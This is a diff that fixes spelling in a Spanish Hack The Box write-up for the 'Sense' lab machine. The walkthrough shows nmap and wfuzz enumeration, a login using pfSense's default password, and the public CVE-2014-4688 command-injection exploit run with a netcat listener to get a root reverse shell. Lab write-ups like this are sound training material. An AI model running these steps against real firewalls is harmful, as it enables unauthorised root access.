@@ -1,7 +1,7 @@
 ---
 layout: single
 title: Sense - Hack The Box
-excerpt: "Esta fue una máquina que jugo un poco con mi paciencia porque utilice fuzzing para listar archivos en la página web para encontrar algo util, que si encontre, pero se tardo bastante, mucho más que en otras máquinas por lo que tuve que hacerme un poco wey en lo que terminada En fin, se encontro información critica como credenciales para accesar al servicio y se utilizo un exploit, el CVE-2014-4688, para poder conectarnos de manera remota, siendo que nos conecta como root, no fue necesario hacer una escalada de privilegios."
+excerpt: "Esta fue una máquina que jugo un poco con mi paciencia porque utilicé Fuzzing para listar archivos en la página web para encontrar algo útil, que, si encontré, pero se tardó bastante, mucho más que en otras máquinas por lo que tuve que hacerme un poco wey en lo que terminaba. En fin, se encontró información crítica como credenciales para acceder al servicio y se utilizó un Exploit, el CVE-2014-4688, para poder conectarnos de manera remota, siendo que nos conecta como Root, no fue necesario hacer una escalada de privilegios."
 date: 2023-03-08
 classes: wide
 header:
@@ -21,11 +21,11 @@ tags:
   - OSCP Style
 ---
 ![](/assets/images/htb-writeup-sense/sense_logo.png)
-Esta fue una máquina que jugo un poco con mi paciencia porque utilice fuzzing para listar archivos en la página web para encontrar algo util, que si encontre, pero se tardo bastante, mucho más que en otras máquinas por lo que tuve que hacerme un poco wey en lo que terminaba. En fin, se encontro información critica como credenciales para accesar al servicio y se utilizo un exploit, el CVE-2014-4688, para poder conectarnos de manera remota, siendo que nos conecta como root, no fue necesario hacer una escalada de privilegios.
+Esta fue una máquina que jugo un poco con mi paciencia porque utilicé **Fuzzing** para listar archivos en la página web para encontrar algo Útil, que, si encontrÉ, pero se tardó bastante, mucho más que en otras máquinas por lo que tuve que hacerme un poco wey en lo que terminaba. En fin, se encontró información crítica como credenciales para accesar al servicio y se utilizó un Exploit, el **CVE-2014-4688**, para poder conectarnos de manera remota, siendo que nos conecta como Root, no fue necesario hacer una escalada de privilegios.
 
 # Recopilación de Información
 ## Traza ICMP
-Vamos a realizar un ping para saber si la máquina esta activa y en base al TTL veremos que SO opera en la máquina.
+Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
 ```
 ping -c 4 10.10.10.60                                                                                     
 PING 10.10.10.60 (10.10.10.60) 56(84) bytes of data.
@@ -73,7 +73,7 @@ Nmap done: 1 IP address (1 host up) scanned in 30.87 seconds
 * -Pn: Para indicar que se omita el descubrimiento de hosts.
 * -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.
 
-Veo unicamente dos puertos activos, el que ya conocemos el puerto HTTP y otro. Veamos que nos dice el escaneo de servicios.
+Veo únicamente dos puertos activos, el que ya conocemos el puerto HTTP y otro. Veamos que nos dice el escaneo de servicios.
 
 ## Escaneo de Servicios
 ```
@@ -102,25 +102,25 @@ Nmap done: 1 IP address (1 host up) scanned in 23.26 seconds
 * -p: Para indicar puertos específicos.
 * -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.
 
-Supongo que al entrar en la página web nos redigira al puerto 443, igualmente vemos que usan un servicio versión **lighthttpd 1.4.35**. Veamos que nos dice la página.
+Supongo que al entrar en la página web nos redirigirá al puerto 443, igualmente vemos que usan un servicio versión **lighthttpd 1.4.35**. Veamos que nos dice la página.
 
-# Analisis de Vulnerabilidades
-## Analisis de Puerto 80
+# Análisis de Vulnerabilidades
+## Análisis de Puerto 80
 Entremos a ver que show.
 
 Justamente, cuando ponemos la IP nos dice que hay riesgo y bla bla bla, dando en acepta el riesgo nos va a redirigir a un login.
 
 ![](/assets/images/htb-writeup-sense/Captura1.png)
 
-Se puede ver algo llamado **PF Sense**, supongo que es el servicio que usa la página, antes de investigarlo, veamos que nos dice el Wappalizer:
+Se puede ver algo llamado **PF Sense**, supongo que es el servicio que usa la página, antes de investigarlo, veamos que nos dice el **Wappalizer**:
 
 ![](/assets/images/htb-writeup-sense/Captura2.png)
 
-Ahi vemos el servidor web y la página usa PHP, ahora investiguemos el servicio.
+Ahí vemos el servidor web y la página usa PHP, ahora investiguemos el servicio.
 
 **pfSense es una distribución personalizada de FreeBSD adaptado para su uso como Firewall y Enrutador. Se caracteriza por ser de código abierto, puede ser instalado en una gran variedad de ordenadores, y además cuenta con una interfaz web sencilla para su configuración.**
 
-Osea que es un Firewall y enrutador, intentemos entrar con credenciales por defecto, estas son:
+Ósea que es un Firewall y enrutador, intentemos entrar con credenciales por defecto, estas son:
 * Username: admin
 * Contraseña: pfsense
 
@@ -128,7 +128,9 @@ Osea que es un Firewall y enrutador, intentemos entrar con credenciales por defe
 
 ![](/assets/images/htb-writeup-sense/Captura4.png)
 
-No pues no sirvio, mejor hagamos un fuzzing para saber que subpáginas tiene. OJO, se tiene que cambiar el comando porque saldran muchos 301, para solucionarlo le agregamos la -L:
+No pues no sirvió, mejor hagamos un Fuzzing para saber que subpáginas tiene. **OJO**, se tiene que cambiar el comando porque saldrán muchos 301, para solucionarlo le agregamos la **-L**.
+
+# Fuzzing
 ```
 wfuzz -L -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.60/FUZZ/
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
@@ -167,16 +169,16 @@ Filtered Requests: 220543
 Requests/sec.: 144.4310
 ```
 * -c: Para que se muestren los resultados con colores.
-* --hc: Para que no muestre el codigo de estado 404, hc = hide code.
-* -t: Para usar una cantidad especifica de hilos.
+* --hc: Para que no muestre el código de estado 404, hc = hide code.
+* -t: Para usar una cantidad específica de hilos.
 * -w: Para usar un diccionario de wordlist.
 * Diccionario que usamos: dirbuster
 
-Veo 2 subpáginas pero installer no servira así que vamos directamente con la **tree**:
+Veo 2 subpáginas, pero **installer** no servirá así que vamos directamente con la **tree**:
 
 ![](/assets/images/htb-writeup-sense/Captura5.png)
 
-El servicio SilverStripe parece ser un gestor de archivos de texto y CSS, que se me hace que podemos listar esos archivos especificandolos en el fuzzing:
+El servicio **SilverStripe** parece ser un gestor de archivos de texto y CSS, que se me hace que podemos listar esos archivos especificándolos en el Fuzzing:
 ```
 wfuzz -L -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.60/FUZZ.txt/
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
@@ -216,21 +218,21 @@ Aparece un archivo llamado **Changelog**, veamos si podemos verlo:
 
 ![](/assets/images/htb-writeup-sense/Captura6.png)
 
-Despues de leer el mensaje que nos aparecio, sabemos que hay una vulnerabilidad que aun no han parchado. Bien pero lo que nos interesa ahorita es saber si podemos acceder a la página web para poder obtener la versión del **PF Sense** y con eso podamos usar un exploit.
+Después de leer el mensaje que nos apareció, sabemos que hay una vulnerabilidad que aún no han parchado. Bien, pero lo que nos interesa ahorita es saber si podemos acceder a la página web para poder obtener la versión del **PF Sense** y con eso podamos usar un Exploit.
 
-Aunque tambien podmeos buscar un exploit para el servicio **SilverStripe**. Pero vamos a ver el otro archivo que se encontro, el **system-users**.
+Aunque tambien podemos buscar un Exploit para el servicio **SilverStripe**. Pero vamos a ver el otro archivo que se encontró, el **system-users**.
 
 ![](/assets/images/htb-writeup-sense/Captura7.png)
 
-Ohhhh ya tenemos un usuario y esta usando la contraseña por defecto de **PF Sense**, intentemos entrar:
+Ohhhh ya tenemos un usuario y está usando la contraseña por defecto de **PF Sense**, intentemos entrar:
 
 ![](/assets/images/htb-writeup-sense/Captura8.png)
 
-Excelente! Ya estamos dentro:
+¡Excelente! Ya estamos dentro:
 
 ![](/assets/images/htb-writeup-sense/Captura9.png)
 
-Ahí esta la versión del **PF Sense**, ahora podemos buscar un exploit para este servicio.
+Ahí está la versión del **PF Sense**, ahora podemos buscar un Exploit para este servicio.
 
 # Explotación Vulnerabilidades
 ```
@@ -243,7 +245,7 @@ pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection                  
 Shellcodes: No Results
 Papers: No Results
 ```
-Solo aparece un exploit, así que vamos a analizarlo para ver como usarlo contra la máquina:
+Solo aparece un Exploit, así que vamos a analizarlo para ver cómo usarlo contra la máquina:
 ```
 searchsploit -m php/webapps/43560.py 
   Exploit: pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection
@@ -253,7 +255,7 @@ searchsploit -m php/webapps/43560.py
  Verified: False
 File Type: Python script, ASCII text executable
 ```
-Despues de ver el contenido del exploit, nos pide los siguientes parametros:
+Después de ver el contenido del Exploit, nos pide los siguientes parámetros:
 ```
 rhost = args.rhost
 lhost = args.lhost
@@ -261,7 +263,7 @@ lport = args.lport
 username = args.username
 password = args.password
 ```
-Incluso si lo ejecutamos, nos dira como usarlo pues ya tiene permisos de ejecución (lo cual no me gusta mucho que digamos pero bueno xd):
+Incluso si lo ejecutamos, nos dirá como usarlo pues ya tiene permisos de ejecución (lo cual no me gusta mucho que digamos, pero bueno xd):
 ```
 ./PFSense_Exploit.py -h
 usage: PFSense_Exploit.py [-h] [--rhost RHOST] [--lhost LHOST] [--lport LPORT] [--username USERNAME] [--password PASSWORD]
@@ -274,13 +276,13 @@ options:
   --username USERNAME  pfsense Username
   --password PASSWORD  pfsense Password
 ```
-Muy bien, pongamos lo que pide y activemoslo:
+Muy bien, pongamos lo que pide y activémoslo:
 * Activamos una netcat
 ```
 nc -nvlp 443                                  
 listening on [any] 443 ...
 ```
-* Usamos el exploit:
+* Usamos el Exploit:
 ```
 ./PFSense_Exploit.py --rhost 10.10.10.60 --lhost 10.10.14.16 --lport 443 --username rohit --password pfsense
 ```
@@ -293,10 +295,10 @@ sh: can't access tty; job control turned off
 # whoami
 root
 ```
-Ahhh prro pues que bien, nos conecto directamente como root.
+Ahhh prro pues que bien, nos conecto directamente como Root.
 
 # Post Explotación
-Ya lo unico que debemos hacer es buscar las flags:
+Ya lo único que debemos hacer es buscar las flags:
 * Flag del usuario:
 ```
 # cd /home
@@ -309,7 +311,7 @@ rohit
 user.txt
 # cat user.txt
 ```
-* Flag del root:
+* Flag del Root:
 ```
 # cd /root
 # ls
@@ -325,7 +327,7 @@ user.txt
 root.txt
 # cat root.txt
 ```
-Y listo!
+¡Y listo!
 
 ## Links de Investigación
 * http://www.securityspace.com/smysecure/catid.html?id=1.3.6.1.4.1.25623.1.0.112122
